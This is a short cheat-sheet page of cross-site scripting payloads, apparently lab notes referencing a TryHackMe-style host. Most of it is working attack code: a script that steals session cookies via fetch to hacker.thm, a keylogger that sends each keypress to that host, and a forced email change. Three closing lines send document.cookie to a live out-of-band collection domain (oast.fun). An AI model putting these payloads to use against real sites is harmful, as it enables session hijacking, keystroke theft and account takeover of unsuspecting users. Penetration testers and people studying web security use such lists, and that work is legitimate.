---
title: "Xss Payloads"
date: 2023-12-31T10:18:17+01:00
# weight: 1
# bookFlatSection: true
# bookToc: false
# bookHidden: true
# bookCollapseSection: true
# bookComments: true
# bookSearchExclude: true
---

Proof of Concept: use `alert()`

Some payloads:
- Proof of Concept

```javascript
<script>alert('XSS');</script>
```
- Session Stealing
```javascript
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```
- Key Logger
```javascript
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

- Business Logic
```javascript
<script>user.changeEmail('attacker@hacker.thm');</script>
```



<script>fetch('twrqpksedkxijngxpeascmu195r6k54po.oast.fun?cookie=' + btoa(document.cookie));</script>
<script>fetch('http://twrqpksedkxijngxpeascmu195r6k54po.oast.fun?cookie=' + document.cookie);</script>

<script>document.location.replace("http://twrqpksedkxijngxpeascmu195r6k54po.oast.fun?content="+document.cookie)</script>